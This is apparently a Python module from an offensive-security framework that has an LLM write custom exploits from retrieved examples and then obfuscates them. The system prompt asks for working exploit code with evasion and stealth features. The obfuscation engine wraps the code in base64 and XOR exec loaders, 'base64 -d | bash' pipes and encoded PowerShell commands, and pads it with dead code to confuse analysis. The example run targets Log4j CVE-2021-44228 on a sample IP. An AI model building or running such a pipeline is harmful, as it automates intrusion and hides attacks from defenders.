"""
Exploit Synthesizer - Dynamic Exploit Code Generation

This module generates custom exploits using:
1. RAG (Retrieval-Augmented Generation) from Vector DB
2. LLM-based code generation
3. Polymorphic obfuscation
4. Syntax validation
5. Sandbox testing

Architecture:
- Query Vector DB for similar exploits
- Use retrieved context to guide LLM
- Generate exploit code in Python/Bash/PowerShell
- Apply obfuscation techniques
- Validate syntax before execution
"""

import os
import ast
import base64
import random
import string
import logging
from typing import Dict, Any, List, Optional, Tuple
from dataclasses import dataclass
from datetime import datetime
from enum import Enum

from langchain_openai import ChatOpenAI
from langchain_core.messages import SystemMessage, HumanMessage
from langchain_core.prompts import ChatPromptTemplate

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class ExploitLanguage(str, Enum):
    """Supported exploit languages"""
    PYTHON = "python"
    BASH = "bash"
    POWERSHELL = "powershell"
    JAVASCRIPT = "javascript"


class ObfuscationTechnique(str, Enum):
    """Obfuscation methods"""
    BASE64 = "base64"
    XOR = "xor"
    ROT13 = "rot13"
    VARIABLE_RENAME = "variable_rename"
    DEAD_CODE = "dead_code"
    POLYMORPHIC = "polymorphic"


@dataclass
class VulnerabilityContext:
    """Context about the vulnerability to exploit"""
    cve_id: Optional[str]
    service_name: str
    service_version: str
    vulnerability_type: str  # RCE, SQLi, XSS, etc.
    description: str
    target_os: str
    target_ip: str
    target_port: int


@dataclass
class ExploitCode:
    """Generated exploit code"""
    language: ExploitLanguage
    code: str
    obfuscated_code: Optional[str] = None
    description: str = ""
    success_probability: float = 0.0
    detection_risk: str = "unknown"
    generated_at: datetime = None
    
    def __post_init__(self):
        if self.generated_at is None:
            self.generated_at = datetime.now()


class RAGExploitRetriever:
    """Retrieve relevant exploits from Vector DB using RAG"""
    
    def __init__(self, vector_db_manager):
        self.vector_db = vector_db_manager
    
    async def retrieve_context(
        self,
        vuln_context: VulnerabilityContext,
        top_k: int = 5
    ) -> List[Dict[str, Any]]:
        """
        Retrieve similar exploits from vector database
        
        Returns:
            List of relevant exploit documents with code examples
        """
        # Build search query
        query = f"""
        {vuln_context.vulnerability_type} vulnerability in {vuln_context.service_name} 
        {vuln_context.service_version} {vuln_context.description}
        """
        
        if vuln_context.cve_id:
            query = f"{vuln_context.cve_id} {query}"
        
        # Search vector DB
        results = self.vector_db.search(
            query=query,
            top_k=top_k,
            severity_filter=None
        )
        
        logger.info(f"Retrieved {len(results)} similar exploits from Vector DB")
        return results


class ExploitCodeGenerator:
    """Generate exploit code using LLM with RAG context"""
    
    SYSTEM_PROMPT = """You are an expert exploit developer for authorized penetration testing.

Your task is to generate working exploit code based on:
1. Vulnerability details
2. Similar exploit examples (RAG context)
3. Target environment

Requirements:
- Code must be syntactically correct
- Include error handling
- Add comments explaining each step
- Make it modular and reusable
- Consider evasion techniques

Output ONLY the code, no explanations outside comments.
"""
    
    def __init__(self, llm_provider):
        self.llm = llm_provider.get_model("gpt-4o")
    
    async def generate(
        self,
        vuln_context: VulnerabilityContext,
        rag_context: List[Dict[str, Any]],
        language: ExploitLanguage = ExploitLanguage.PYTHON
    ) -> ExploitCode:
        """
        Generate exploit code using LLM + RAG
        
        Args:
            vuln_context: Details about the vulnerability
            rag_context: Similar exploits from Vector DB
            language: Target programming language
        
        Returns:
            ExploitCode object
        """
        logger.info(f"Generating {language} exploit for {vuln_context.service_name}")
        
        # Build RAG context string
        rag_examples = "\n\n".join([
            f"Example {i+1} ({doc['cve_id']}):\n{doc.get('description', 'N/A')}"
            for i, doc in enumerate(rag_context[:3])
        ])
        
        # Create prompt
        prompt = f"""
Generate a {language} exploit for this vulnerability:

TARGET INFORMATION:
- Service: {vuln_context.service_name} {vuln_context.service_version}
- Vulnerability: {vuln_context.vulnerability_type}
- CVE: {vuln_context.cve_id or 'N/A'}
- Description: {vuln_context.description}
- Target: {vuln_context.target_ip}:{vuln_context.target_port}
- OS: {vuln_context.target_os}

SIMILAR EXPLOITS (for reference):
{rag_examples}

REQUIREMENTS:
1. Generate working {language} code
2. Include connection handling
3. Add payload delivery mechanism
4. Implement error handling
5. Add stealth features (delay, randomization)
6. Comment each major step

Generate the exploit code now:
"""
        
        messages = [
            SystemMessage(content=self.SYSTEM_PROMPT),
            HumanMessage(content=prompt)
        ]
        
        # Get LLM response
        response = await self.llm.ainvoke(messages)
        
        # Extract code (remove markdown if present)
        code = response.content
        if "```" in code:
            # Extract code from markdown block
            code = code.split("```")[1]
            if code.startswith(language):
                code = code[len(language):].strip()
        
        # Create ExploitCode object
        exploit = ExploitCode(
            language=language,
            code=code,
            description=f"Generated exploit for {vuln_context.cve_id or vuln_context.service_name}",
            success_probability=0.7,  # TODO: Estimate based on context
            detection_risk="medium"
        )
        
        logger.info(f"Generated {len(code)} bytes of {language} code")
        return exploit


class ObfuscationEngine:
    """Apply various obfuscation techniques to exploit code"""
    
    def __init__(self):
        self.techniques = {
            ObfuscationTechnique.BASE64: self._base64_obfuscate,
            ObfuscationTechnique.XOR: self._xor_obfuscate,
            ObfuscationTechnique.VARIABLE_RENAME: self._rename_variables,
            ObfuscationTechnique.DEAD_CODE: self._inject_dead_code,
        }
    
    def obfuscate(
        self,
        code: str,
        language: ExploitLanguage,
        techniques: List[ObfuscationTechnique]
    ) -> str:
        """
        Apply multiple obfuscation techniques
        
        Args:
            code: Original exploit code
            language: Programming language
            techniques: List of obfuscation methods to apply
        
        Returns:
            Obfuscated code
        """
        obfuscated = code
        
        for technique in techniques:
            if technique in self.techniques:
                obfuscated = self.techniques[technique](obfuscated, language)
                logger.info(f"Applied {technique} obfuscation")
        
        return obfuscated
    
    def _base64_obfuscate(self, code: str, language: ExploitLanguage) -> str:
        """Base64 encode payload"""
        if language == ExploitLanguage.PYTHON:
            encoded = base64.b64encode(code.encode()).decode()
            wrapper = f"""
import base64
exec(base64.b64decode('{encoded}').decode())
"""
            return wrapper
        
        elif language == ExploitLanguage.BASH:
            encoded = base64.b64encode(code.encode()).decode()
            wrapper = f"""
echo '{encoded}' | base64 -d | bash
"""
            return wrapper
        
        elif language == ExploitLanguage.POWERSHELL:
            encoded = base64.b64encode(code.encode('utf-16le')).decode()
            wrapper = f"""
powershell -EncodedCommand {encoded}
"""
            return wrapper
        
        return code
    
    def _xor_obfuscate(self, code: str, language: ExploitLanguage) -> str:
        """XOR encryption with random key"""
        if language != ExploitLanguage.PYTHON:
            return code  # Only implemented for Python
        
        # Generate random XOR key
        key = random.randint(1, 255)
        
        # XOR encode
        encoded = ''.join(chr(ord(c) ^ key) for c in code)
        encoded_hex = encoded.encode('latin1').hex()
        
        wrapper = f"""
key = {key}
encrypted = bytes.fromhex('{encoded_hex}')
decrypted = ''.join(chr(b ^ key) for b in encrypted)
exec(decrypted)
"""
        return wrapper
    
    def _rename_variables(self, code: str, language: ExploitLanguage) -> str:
        """Rename variables to random strings"""
        if language != ExploitLanguage.PYTHON:
            return code
        
        try:
            # Parse AST
            tree = ast.parse(code)
            
            # Find all variable names
            var_names = set()
            for node in ast.walk(tree):
                if isinstance(node, ast.Name):
                    var_names.add(node.id)
            
            # Create mapping to random names
            mapping = {
                name: f"_{self._random_string(8)}"
                for name in var_names
                if not name.startswith('_') and name not in dir(__builtins__)
            }
            
            # Replace in code
            obfuscated = code
            for old, new in mapping.items():
                obfuscated = obfuscated.replace(old, new)
            
            return obfuscated
            
        except SyntaxError:
            logger.warning("Failed to parse code for variable renaming")
            return code
    
    def _inject_dead_code(self, code: str, language: ExploitLanguage) -> str:
        """Inject dead code to confuse analysis"""
        if language != ExploitLanguage.PYTHON:
            return code
        
        dead_code_snippets = [
            "import time; _ = time.time()",
            "import os; _ = os.getpid()",
            "import random; _ = random.random()",
            "_ = [i for i in range(10)]",
            "_ = {'key': 'value'}",
        ]
        
        # Insert random dead code
        lines = code.split('\n')
        for _ in range(3):
            pos = random.randint(0, len(lines))
            lines.insert(pos, random.choice(dead_code_snippets))
        
        return '\n'.join(lines)
    
    def _random_string(self, length: int) -> str:
        """Generate random string"""
        return ''.join(random.choices(string.ascii_lowercase, k=length))


class SyntaxValidator:
    """Validate generated code syntax"""
    
    @staticmethod
    def validate_python(code: str) -> Tuple[bool, Optional[str]]:
        """Validate Python syntax"""
        try:
            ast.parse(code)
            return True, None
        except SyntaxError as e:
            return False, str(e)
    
    @staticmethod
    def validate_bash(code: str) -> Tuple[bool, Optional[str]]:
        """Validate Bash syntax (basic check)"""
        # Basic validation - check for common syntax errors
        if code.count('(') != code.count(')'):
            return False, "Unmatched parentheses"
        if code.count('{') != code.count('}'):
            return False, "Unmatched braces"
        return True, None
    
    @staticmethod
    def validate(code: str, language: ExploitLanguage) -> Tuple[bool, Optional[str]]:
        """Validate code syntax"""
        validators = {
            ExploitLanguage.PYTHON: SyntaxValidator.validate_python,
            ExploitLanguage.BASH: SyntaxValidator.validate_bash,
        }
        
        if language in validators:
            return validators[language](code)
        
        return True, None  # No validator available


class ExploitSynthesizer:
    """Main exploit synthesis orchestrator"""
    
    def __init__(self, llm_provider, vector_db_manager):
        self.rag_retriever = RAGExploitRetriever(vector_db_manager)
        self.code_generator = ExploitCodeGenerator(llm_provider)
        self.obfuscator = ObfuscationEngine()
        self.validator = SyntaxValidator()
    
    async def synthesize(
        self,
        vuln_context: VulnerabilityContext,
        language: ExploitLanguage = ExploitLanguage.PYTHON,
        obfuscate: bool = True
    ) -> ExploitCode:
        """
        Complete exploit synthesis pipeline
        
        Steps:
        1. Retrieve similar exploits (RAG)
        2. Generate code using LLM
        3. Validate syntax
        4. Apply obfuscation
        5. Return final exploit
        """
        logger.info(f"Starting exploit synthesis for {vuln_context.cve_id or vuln_context.service_name}")
        
        # Step 1: RAG retrieval
        rag_context = await self.rag_retriever.retrieve_context(vuln_context)
        
        # Step 2: Generate code
        exploit = await self.code_generator.generate(
            vuln_context=vuln_context,
            rag_context=rag_context,
            language=language
        )
        
        # Step 3: Validate syntax
        is_valid, error = self.validator.validate(exploit.code, language)
        
        if not is_valid:
            logger.error(f"Generated code has syntax error: {error}")
            # TODO: Send back to LLM for correction
            exploit.detection_risk = "high"
            return exploit
        
        logger.info("Code syntax validated successfully")
        
        # Step 4: Obfuscate
        if obfuscate:
            techniques = [
                ObfuscationTechnique.VARIABLE_RENAME,
                ObfuscationTechnique.DEAD_CODE,
                ObfuscationTechnique.BASE64,
            ]
            
            exploit.obfuscated_code = self.obfuscator.obfuscate(
                code=exploit.code,
                language=language,
                techniques=techniques
            )
            
            logger.info("Code obfuscation completed")
        
        logger.info("Exploit synthesis completed")
        return exploit


# Example usage
if __name__ == "__main__":
    import asyncio
    from services.cognitive_agents.agent_framework import LLMProvider
    from services.knowledge_matrix.vector_db import VectorDBManager
    
    async def main():
        # Initialize
        llm_provider = LLMProvider()
        vector_db = VectorDBManager(host="localhost", port=19530)
        
        synthesizer = ExploitSynthesizer(llm_provider, vector_db)
        
        # Example vulnerability
        vuln = VulnerabilityContext(
            cve_id="CVE-2021-44228",
            service_name="Apache Log4j",
            service_version="2.14.1",
            vulnerability_type="RCE",
            description="JNDI injection via log message",
            target_os="Linux",
            target_ip="192.168.1.10",
            target_port=8080
        )
        
        # Synthesize exploit
        exploit = await synthesizer.synthesize(vuln, obfuscate=True)
        
        print("\n=== Generated Exploit ===")
        print(f"Language: {exploit.language}")
        print(f"Detection Risk: {exploit.detection_risk}")
        print(f"\nOriginal Code:\n{exploit.code}")
        print(f"\nObfuscated Code:\n{exploit.obfuscated_code}")
        
        vector_db.close()
    
    asyncio.run(main())
